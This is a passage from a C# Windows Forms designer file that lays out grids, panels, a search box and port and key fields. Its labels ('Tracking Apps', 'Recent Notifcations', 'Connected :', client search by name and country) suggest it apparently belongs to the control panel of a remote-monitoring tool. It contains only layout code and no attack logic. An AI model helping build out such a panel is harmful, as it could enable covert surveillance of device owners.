            this.DGFW.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle19.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle19.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle19.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle19.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle19.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle19.SelectionForeColor = System.Drawing.Color.Black;
            dataGridViewCellStyle19.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGFW.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle19;
            this.DGFW.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGFW.ContextMenuStrip = this.FWctx;
            this.DGFW.Cursor = System.Windows.Forms.Cursors.Hand;
            dataGridViewCellStyle20.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle20.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle20.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle20.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle20.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle20.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            dataGridViewCellStyle20.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGFW.DefaultCellStyle = dataGridViewCellStyle20;
            this.DGFW.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DGFW.EnableHeadersVisualStyles = false;
            this.DGFW.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DGFW.Location = new System.Drawing.Point(39, 281);
            this.DGFW.Margin = new System.Windows.Forms.Padding(4);
            this.DGFW.MultiSelect = false;
            this.DGFW.Name = "DGFW";
            this.DGFW.ReadOnly = true;
            this.DGFW.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle21.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle21.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle21.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle21.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle21.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle21.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            dataGridViewCellStyle21.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGFW.RowHeadersDefaultCellStyle = dataGridViewCellStyle21;
            this.DGFW.RowHeadersVisible = false;
            this.DGFW.RowHeadersWidth = 62;
            dataGridViewCellStyle22.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle22.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle22.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle22.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle22.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.DGFW.RowsDefaultCellStyle = dataGridViewCellStyle22;
            this.DGFW.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGFW.ShowCellToolTips = false;
            this.DGFW.Size = new System.Drawing.Size(348, 171);
            this.DGFW.TabIndex = 4;
            this.DGFW.Tag = "b";
            // 
            // TRKPANEL
            // 
            this.TRKPANEL.Controls.Add(this.DGVTRK);
            this.TRKPANEL.Controls.Add(this.Panel17);
            this.TRKPANEL.Controls.Add(this.recordsShowpanel);
            this.TRKPANEL.Dock = System.Windows.Forms.DockStyle.Fill;
            this.TRKPANEL.Location = new System.Drawing.Point(0, 0);
            this.TRKPANEL.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.TRKPANEL.Name = "TRKPANEL";
            this.TRKPANEL.Size = new System.Drawing.Size(421, 500);
            this.TRKPANEL.TabIndex = 30;
            // 
            // DGVTRK
            // 
            this.DGVTRK.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
            this.DGVTRK.AllowUserToAddRows = false;
            this.DGVTRK.AllowUserToDeleteRows = false;
            this.DGVTRK.AllowUserToResizeColumns = false;
            this.DGVTRK.AllowUserToResizeRows = false;
            dataGridViewCellStyle23.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle23.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle23.ForeColor = System.Drawing.Color.Cyan;
            dataGridViewCellStyle23.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle23.SelectionForeColor = System.Drawing.Color.Black;
            this.DGVTRK.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle23;
            this.DGVTRK.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DGVTRK.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGVTRK.BackgroundColor = System.Drawing.Color.Black;
            this.DGVTRK.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle24.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle24.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle24.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle24.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle24.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle24.SelectionForeColor = System.Drawing.Color.Black;
            dataGridViewCellStyle24.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGVTRK.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle24;
            this.DGVTRK.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGVTRK.ContextMenuStrip = this.TRKctx;
            this.DGVTRK.Cursor = System.Windows.Forms.Cursors.Hand;
            dataGridViewCellStyle25.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle25.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle25.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle25.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle25.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle25.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            dataGridViewCellStyle25.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGVTRK.DefaultCellStyle = dataGridViewCellStyle25;
            this.DGVTRK.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DGVTRK.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DGVTRK.EnableHeadersVisualStyles = false;
            this.DGVTRK.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DGVTRK.Location = new System.Drawing.Point(0, 32);
            this.DGVTRK.Margin = new System.Windows.Forms.Padding(4);
            this.DGVTRK.MultiSelect = false;
            this.DGVTRK.Name = "DGVTRK";
            this.DGVTRK.ReadOnly = true;
            this.DGVTRK.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle26.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle26.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle26.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle26.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle26.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle26.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            dataGridViewCellStyle26.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGVTRK.RowHeadersDefaultCellStyle = dataGridViewCellStyle26;
            this.DGVTRK.RowHeadersVisible = false;
            this.DGVTRK.RowHeadersWidth = 62;
            dataGridViewCellStyle27.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle27.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle27.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle27.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle27.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.DGVTRK.RowsDefaultCellStyle = dataGridViewCellStyle27;
            this.DGVTRK.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGVTRK.ShowCellToolTips = false;
            this.DGVTRK.Size = new System.Drawing.Size(421, 468);
            this.DGVTRK.TabIndex = 4;
            this.DGVTRK.Tag = "b";
            // 
            // Panel17
            // 
            this.Panel17.BackColor = System.Drawing.Color.Black;
            this.Panel17.Controls.Add(this.Label5);
            this.Panel17.Controls.Add(this.combodatestrack);
            this.Panel17.Controls.Add(this.DrakeUIAvatar11);
            this.Panel17.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel17.Location = new System.Drawing.Point(0, 0);
            this.Panel17.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel17.Name = "Panel17";
            this.Panel17.Size = new System.Drawing.Size(421, 32);
            this.Panel17.TabIndex = 41;
            // 
            // Label5
            // 
            this.Label5.BackColor = System.Drawing.Color.Black;
            this.Label5.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Label5.Location = new System.Drawing.Point(35, 0);
            this.Label5.Name = "Label5";
            this.Label5.Size = new System.Drawing.Size(239, 32);
            this.Label5.TabIndex = 40;
            this.Label5.Text = "Tracking Apps";
            this.Label5.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // combodatestrack
            // 
            this.combodatestrack.AllowDrop = true;
            this.combodatestrack.BackColor = System.Drawing.Color.Transparent;
            this.combodatestrack.CausesValidation = false;
            this.combodatestrack.Dock = System.Windows.Forms.DockStyle.Right;
            this.combodatestrack.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.combodatestrack.FillColor = System.Drawing.Color.Black;
            this.combodatestrack.Font = new System.Drawing.Font("Calibri", 11F);
            this.combodatestrack.FormattingEnabled = true;
            this.combodatestrack.ItemHeight = 20;
            this.combodatestrack.Location = new System.Drawing.Point(274, 0);
            this.combodatestrack.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.combodatestrack.MinimumSize = new System.Drawing.Size(61, 0);
            this.combodatestrack.Name = "combodatestrack";
            this.combodatestrack.Padding = new System.Windows.Forms.Padding(0, 0, 40, 0);
            this.combodatestrack.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            this.combodatestrack.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.combodatestrack.Size = new System.Drawing.Size(147, 30);
            this.combodatestrack.Style = DrakeUI.Framework.UIStyle.Custom;
            this.combodatestrack.StyleCustomMode = true;
            this.combodatestrack.TabIndex = 41;
            this.combodatestrack.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // recordsShowpanel
            // 
            this.recordsShowpanel.BackColor = System.Drawing.Color.BlanchedAlmond;
            this.recordsShowpanel.Controls.Add(this.recordshowtext);
            this.recordsShowpanel.Controls.Add(this.DrakeUIButtonIcon20);
            this.recordsShowpanel.Dock = System.Windows.Forms.DockStyle.Fill;
            this.recordsShowpanel.Location = new System.Drawing.Point(0, 0);
            this.recordsShowpanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.recordsShowpanel.Name = "recordsShowpanel";
            this.recordsShowpanel.Size = new System.Drawing.Size(421, 500);
            this.recordsShowpanel.TabIndex = 42;
            // 
            // recordshowtext
            // 
            this.recordshowtext.BackColor = System.Drawing.Color.Black;
            this.recordshowtext.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.recordshowtext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.recordshowtext.ForeColor = System.Drawing.Color.White;
            this.recordshowtext.Location = new System.Drawing.Point(0, 43);
            this.recordshowtext.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.recordshowtext.Multiline = true;
            this.recordshowtext.Name = "recordshowtext";
            this.recordshowtext.ReadOnly = true;
            this.recordshowtext.Size = new System.Drawing.Size(421, 457);
            this.recordshowtext.TabIndex = 34;
            // 
            // Panel6
            // 
            this.Panel6.BackColor = System.Drawing.Color.Black;
            this.Panel6.Controls.Add(this.clearsrchbtn);
            this.Panel6.Controls.Add(this.searchtext);
            this.Panel6.Controls.Add(this.searchbtn);
            this.Panel6.Controls.Add(this.Panel18);
            this.Panel6.Controls.Add(this.DrakeUIAvatar1);
            this.Panel6.Controls.Add(this.TCavatar);
            this.Panel6.Controls.Add(this.uncheckbtn);
            this.Panel6.Controls.Add(this.clientfoldrbtn);
            this.Panel6.Controls.Add(this.DrakeUIAvatar4);
            this.Panel6.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel6.Location = new System.Drawing.Point(9, 5);
            this.Panel6.Margin = new System.Windows.Forms.Padding(4);
            this.Panel6.Name = "Panel6";
            this.Panel6.Size = new System.Drawing.Size(179, 33);
            this.Panel6.TabIndex = 22;
            // 
            // searchtext
            // 
            this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.searchtext.Dock = System.Windows.Forms.DockStyle.Left;
            this.searchtext.FillColor = System.Drawing.Color.Black;
            this.searchtext.Font = new System.Drawing.Font("Calibri", 12F);
            this.searchtext.ForeColor = System.Drawing.Color.White;
            this.searchtext.Location = new System.Drawing.Point(160, 0);
            this.searchtext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.searchtext.Maximum = 2147483647D;
            this.searchtext.Minimum = -2147483648D;
            this.searchtext.Name = "searchtext";
            this.searchtext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.searchtext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.searchtext.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.searchtext.Size = new System.Drawing.Size(327, 32);
            this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.searchtext.StyleCustomMode = true;
            this.searchtext.TabIndex = 0;
            this.searchtext.Watermark = "Search By Name,Country,Addres,...";
            this.searchtext.TextChanged += new System.EventHandler(this.Searchtext_TextChanged);
            // 
            // searchbtn
            // 
            this.searchbtn.AvatarSize = 25;
            this.searchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.searchbtn.Dock = System.Windows.Forms.DockStyle.Left;
            this.searchbtn.FillColor = System.Drawing.Color.Black;
            this.searchbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.searchbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.searchbtn.Location = new System.Drawing.Point(109, 0);
            this.searchbtn.Margin = new System.Windows.Forms.Padding(4);
            this.searchbtn.Name = "searchbtn";
            this.searchbtn.Size = new System.Drawing.Size(51, 33);
            this.searchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.searchbtn.StyleCustomMode = true;
            this.searchbtn.Symbol = 85;
            this.searchbtn.SymbolSize = 30;
            this.searchbtn.TabIndex = 1;
            this.searchbtn.Click += new System.EventHandler(this.Searchbtn_Click);
            // 
            // Panel18
            // 
            this.Panel18.BackColor = System.Drawing.Color.Black;
            this.Panel18.Dock = System.Windows.Forms.DockStyle.Left;
            this.Panel18.Location = new System.Drawing.Point(90, 0);
            this.Panel18.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel18.Name = "Panel18";
            this.Panel18.Size = new System.Drawing.Size(19, 33);
            this.Panel18.TabIndex = 36;
            // 
            // TCavatar
            // 
            this.TCavatar.BackColor = System.Drawing.Color.Transparent;
            this.TCavatar.Dock = System.Windows.Forms.DockStyle.Right;
            this.TCavatar.Location = new System.Drawing.Point(54, 0);
            this.TCavatar.Margin = new System.Windows.Forms.Padding(4);
            this.TCavatar.Name = "TCavatar";
            this.TCavatar.Size = new System.Drawing.Size(55, 33);
            this.TCavatar.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.TCavatar.TabIndex = 21;
            this.TCavatar.TabStop = false;
            // 
            // Panel19
            // 
            this.Panel19.BackColor = System.Drawing.Color.Black;
            this.Panel19.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel19.Location = new System.Drawing.Point(9, 0);
            this.Panel19.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel19.Name = "Panel19";
            this.Panel19.Size = new System.Drawing.Size(179, 5);
            this.Panel19.TabIndex = 37;
            // 
            // Panel4
            // 
            this.Panel4.BackColor = System.Drawing.Color.Black;
            this.Panel4.Dock = System.Windows.Forms.DockStyle.Left;
            this.Panel4.Location = new System.Drawing.Point(0, 0);
            this.Panel4.Margin = new System.Windows.Forms.Padding(4);
            this.Panel4.Name = "Panel4";
            this.Panel4.Size = new System.Drawing.Size(9, 255);
            this.Panel4.TabIndex = 20;
            // 
            // Panel13
            // 
            this.Panel13.BackColor = System.Drawing.Color.Red;
            this.Panel13.Location = new System.Drawing.Point(909, 139);
            this.Panel13.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel13.Name = "Panel13";
            this.Panel13.Size = new System.Drawing.Size(261, 95);
            this.Panel13.TabIndex = 0;
            // 
            // notifispanel
            // 
            this.notifispanel.Controls.Add(this.DrakeUIButtonIcon8);
            this.notifispanel.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(225)))), ((int)(((byte)(245)))), ((int)(((byte)(254)))));
            this.notifispanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.notifispanel.ForeColor = System.Drawing.Color.White;
            this.notifispanel.Location = new System.Drawing.Point(89, 106);
            this.notifispanel.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.notifispanel.Name = "notifispanel";
            this.notifispanel.Padding = new System.Windows.Forms.Padding(0, 34, 0, 0);
            this.notifispanel.Radius = 55;
            this.notifispanel.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.notifispanel.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.notifispanel.Size = new System.Drawing.Size(125, 111);
            this.notifispanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.notifispanel.StyleCustomMode = true;
            this.notifispanel.TabIndex = 1;
            this.notifispanel.Text = "Recent Notifcations";
            this.notifispanel.TitleColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.notifispanel.TitleInterval = 100;
            // 
            // Panel7
            // 
            this.Panel7.BackColor = System.Drawing.Color.Black;
            this.Panel7.Controls.Add(this.DrakeUIButtonIcon9);
            this.Panel7.Location = new System.Drawing.Point(100, 673);
            this.Panel7.Margin = new System.Windows.Forms.Padding(4);
            this.Panel7.Name = "Panel7";
            this.Panel7.Size = new System.Drawing.Size(116, 33);
            this.Panel7.TabIndex = 23;
            // 
            // DGVALRTS
            // 
            this.DGVALRTS.AllowUserToAddRows = false;
            this.DGVALRTS.AllowUserToDeleteRows = false;
            this.DGVALRTS.AllowUserToResizeColumns = false;
            this.DGVALRTS.AllowUserToResizeRows = false;
            this.DGVALRTS.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DGVALRTS.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGVALRTS.BackgroundColor = System.Drawing.Color.Black;
            this.DGVALRTS.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.DGVALRTS.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.DGVALRTS.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGVALRTS.ColumnHeadersVisible = false;
            this.DGVALRTS.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.DataGridViewImageColumn4,
            this.DataGridViewTextBoxColumn3});
            dataGridViewCellStyle28.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle28.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle28.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle28.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle28.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            dataGridViewCellStyle28.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle28.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGVALRTS.DefaultCellStyle = dataGridViewCellStyle28;
            this.DGVALRTS.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DGVALRTS.EnableHeadersVisualStyles = false;
            this.DGVALRTS.Location = new System.Drawing.Point(0, 34);
            this.DGVALRTS.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.DGVALRTS.Name = "DGVALRTS";
            this.DGVALRTS.ReadOnly = true;
            this.DGVALRTS.RowHeadersVisible = false;
            this.DGVALRTS.RowHeadersWidth = 62;
            this.DGVALRTS.RowTemplate.Height = 24;
            this.DGVALRTS.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGVALRTS.Size = new System.Drawing.Size(477, 17);
            this.DGVALRTS.TabIndex = 1;
            // 
            // DataGridViewImageColumn4
            // 
            this.DataGridViewImageColumn4.FillWeight = 33.12183F;
            this.DataGridViewImageColumn4.HeaderText = "image";
            this.DataGridViewImageColumn4.MinimumWidth = 8;
            this.DataGridViewImageColumn4.Name = "DataGridViewImageColumn4";
            this.DataGridViewImageColumn4.ReadOnly = true;
            // 
            // DataGridViewTextBoxColumn3
            // 
            this.DataGridViewTextBoxColumn3.FillWeight = 111.8782F;
            this.DataGridViewTextBoxColumn3.HeaderText = "notifi";
            this.DataGridViewTextBoxColumn3.MinimumWidth = 8;
            this.DataGridViewTextBoxColumn3.Name = "DataGridViewTextBoxColumn3";
            this.DataGridViewTextBoxColumn3.ReadOnly = true;
            // 
            // Panel12
            // 
            this.Panel12.BackColor = System.Drawing.Color.Black;
            this.Panel12.Controls.Add(this.DrakeUIButtonIcon11);
            this.Panel12.Controls.Add(this.DrakeUIButtonIcon10);
            this.Panel12.Controls.Add(this.DrakeUIButtonIcon7);
            this.Panel12.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel12.Location = new System.Drawing.Point(0, 0);
            this.Panel12.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel12.Name = "Panel12";
            this.Panel12.Size = new System.Drawing.Size(187, 57);
            this.Panel12.TabIndex = 1;
            // 
            // Panel9
            // 
            this.Panel9.Controls.Add(this.addpo);
            this.Panel9.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel9.Location = new System.Drawing.Point(0, 192);
            this.Panel9.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel9.Name = "Panel9";
            this.Panel9.Size = new System.Drawing.Size(133, 44);
            this.Panel9.TabIndex = 3;
            // 
            // infolowtext
            // 
            this.infolowtext.Cursor = System.Windows.Forms.Cursors.SizeNS;
            this.infolowtext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.infolowtext.Font = new System.Drawing.Font("Calibri", 9F, System.Drawing.FontStyle.Bold);
            this.infolowtext.ForeColor = System.Drawing.Color.Lime;
            this.infolowtext.Location = new System.Drawing.Point(0, 54);
            this.infolowtext.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.infolowtext.Name = "infolowtext";
            this.infolowtext.Size = new System.Drawing.Size(1419, 615);
            this.infolowtext.TabIndex = 4;
            this.infolowtext.Text = "Connected :";
            this.infolowtext.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.infolowtext.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Label2_MouseDown);
            this.infolowtext.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Label2_MouseMove);
            this.infolowtext.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Label2_MouseUp);
            // 
            // Panel11
            // 
            this.Panel11.Controls.Add(this.passtxt);
            this.Panel11.Controls.Add(this.clearbtn);
            this.Panel11.Controls.Add(this.rempo);
            this.Panel11.Controls.Add(this.porttext);
            this.Panel11.Controls.Add(this.checksavepass);
            this.Panel11.Controls.Add(this.DrakeUIAvatar2);
            this.Panel11.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel11.Location = new System.Drawing.Point(0, 0);
            this.Panel11.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel11.Name = "Panel11";
            this.Panel11.Size = new System.Drawing.Size(1421, 52);
            this.Panel11.TabIndex = 3;
            // 
            // passtxt
            // 
            this.passtxt.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.passtxt.FillColor = System.Drawing.Color.White;
            this.passtxt.Font = new System.Drawing.Font("Calibri", 12F);
            this.passtxt.Location = new System.Drawing.Point(4, 4);
            this.passtxt.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.passtxt.Maximum = 2147483647D;
            this.passtxt.Minimum = -2147483648D;
            this.passtxt.Name = "passtxt";
            this.passtxt.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.passtxt.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.passtxt.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.passtxt.Size = new System.Drawing.Size(157, 32);
            this.passtxt.Style = DrakeUI.Framework.UIStyle.Custom;
            this.passtxt.TabIndex = 51;
            this.passtxt.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
            this.passtxt.Watermark = "Key";
            // 
            // rempo
            // 
            this.rempo.Cursor = System.Windows.Forms.Cursors.Hand;
            this.rempo.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.rempo.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.rempo.Location = new System.Drawing.Point(1384, 4);
            this.rempo.Margin = new System.Windows.Forms.Padding(4);
            this.rempo.Name = "rempo";
            this.rempo.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.rempo.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.rempo.Size = new System.Drawing.Size(35, 30);
            this.rempo.Style = DrakeUI.Framework.UIStyle.Custom;
            this.rempo.Symbol = 61525;
            this.rempo.TabIndex = 59;
            this.rempo.Click += new System.EventHandler(this.DrakeUIAvatar2_Click);
            // 
            // porttext
            // 
            this.porttext.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.porttext.FillColor = System.Drawing.Color.Black;
            this.porttext.Font = new System.Drawing.Font("Calibri", 12F);
            this.porttext.ForeColor = System.Drawing.Color.White;
            this.porttext.Location = new System.Drawing.Point(1005, 4);
            this.porttext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.porttext.Maximum = 2147483647D;
            this.porttext.Minimum = -2147483648D;
            this.porttext.Name = "porttext";
            this.porttext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.porttext.Radius = 10;
            this.porttext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.porttext.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.porttext.Size = new System.Drawing.Size(163, 32);
            this.porttext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.porttext.StyleCustomMode = true;
            this.porttext.TabIndex = 57;
            this.porttext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
            this.porttext.Watermark = "PORT";
            this.porttext.TextChanged += new System.EventHandler(this.Porttext_TextChanged);
            // 
            // checksavepass
            // 
            this.checksavepass.BackColor = System.Drawing.Color.Transparent;
